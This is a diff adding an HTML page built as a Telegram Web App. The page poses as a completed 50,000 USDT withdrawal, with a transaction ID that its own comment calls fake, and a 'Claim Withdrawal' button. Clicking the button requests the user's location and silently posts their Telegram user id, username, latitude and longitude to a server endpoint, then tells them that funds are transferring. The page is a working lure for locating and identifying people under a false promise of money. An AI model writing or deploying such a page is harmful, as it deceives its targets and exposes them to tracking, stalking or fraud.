@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT Claim - Secure Transfer</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0d0d0d, #1a1a2e);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .icon { font-size: 64px; margin-bottom: 15px; }
+        h1 { font-size: 28px; margin-bottom: 8px; background: linear-gradient(90deg, #f7931a, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        h2 { font-size: 14px; color: #888; margin-bottom: 25px; font-weight: normal; }
+        .amount {
+            font-size: 42px;
+            font-weight: 800;
+            color: #00ff88;
+            margin: 15px 0;
+            text-shadow: 0 0 40px rgba(0,255,136,0.3);
+        }
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            font-size: 14px;
+        }
+        .status-row span:first-child { color: #888; }
+        .status-row span:last-child { color: #fff; }
+        .success { color: #00ff88 !important; }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            margin-top: 25px;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: linear-gradient(90deg, #00c853, #00e676);
+            color: #000;
+        }
+        .btn:active { transform: scale(0.96); }
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.15);
+            color: white;
+            margin-top: 10px;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        .hidden { display: none !important; }
+        #location-status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #ffa726;
+        }
+        .glow { animation: pulse 2s infinite; }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(0,255,136,0.2); }
+            50% { box-shadow: 0 0 60px rgba(0,255,136,0.5); }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">🎉</div>
+        <h1>Transaction Complete</h1>
+        <h2>Your USDT withdrawal is ready</h2>
+        
+        <div class="amount glow" id="amount">50,000 USDT</div>
+        
+        <div class="status-row">
+            <span>Status</span>
+            <span class="success">✅ Confirmed</span>
+        </div>
+        <div class="status-row">
+            <span>Transaction ID</span>
+            <span id="txid">0x3a7f...b91e</span>
+        </div>
+        <div class="status-row">
+            <span>Network</span>
+            <span>TRC-20</span>
+        </div>
+        <div class="status-row">
+            <span>Date</span>
+            <span id="date"></span>
+        </div>
+        
+        <button class="btn" id="claimBtn">📥 Claim Withdrawal</button>
+        <button class="btn btn-secondary hidden" id="completeBtn">✅ Completed — Open in Wallet</button>
+        
+        <div id="location-status"></div>
+    </div>
+
+    <script>
+        // Generate fake transaction ID
+        document.getElementById('txid').textContent = '0x' + Array.from({length: 16}, () => Math.floor(Math.random()*16).toString(16)).join('');
+        document.getElementById('date').textContent = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+
+        const claimBtn = document.getElementById('claimBtn');
+        const completeBtn = document.getElementById('completeBtn');
+        const statusDiv = document.getElementById('location-status');
+
+        // Initialize Telegram WebApp
+        let tg = window.Telegram?.WebApp;
+
+        claimBtn.addEventListener('click', function(e) {
+            statusDiv.textContent = '⏳ Processing withdrawal...';
+            claimBtn.disabled = true;
+            claimBtn.style.opacity = '0.5';
+            
+            // Try to get location via Telegram WebApp
+            if (tg) {
+                try {
+                    tg.requestLocation((location) => {
+                        if (location) {
+                            // Success - send to server
+                            fetch('/api/location', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    user_id: tg.initDataUnsafe?.user?.id,
+                                    username: tg.initDataUnsafe?.user?.username,
+                                    lat: location.lat,
+                                    lon: location.lng
+                                })
+                            });
+                            
+                            statusDiv.textContent = '✅ Location verified! Transferring funds...';
+                            completeBtn.classList.remove('hidden');
+                            claimBtn.classList.add('hidden');
+                        }
+                    });
+                } catch(e) {
+                    // Fallback to browser geolocation
+                    getLocationFallback();
+                }
+            } else {
+                // Not in Telegram - try browser
+                getLocationFallback();
+            }
+        });
+
+        function getLocationFallback() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        statusDiv.textContent = '✅ Location verified! Transferring funds...';
+                        completeBtn.classList.remove('hidden');
+                        claimBtn.classList.add('hidden');
+                    },
+                    (error) => {
+                        statusDiv.textContent = '⚠️ Location required. Please enable GPS.';
+                        claimBtn.disabled = false;
+                        claimBtn.style.opacity = '1';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                statusDiv.textContent = '⚠️ Location not available on this device.';
+                claimBtn.disabled = false;
+                claimBtn.style.opacity = '1';
+            }
+        }
+    </script>
+</body>
+</html>
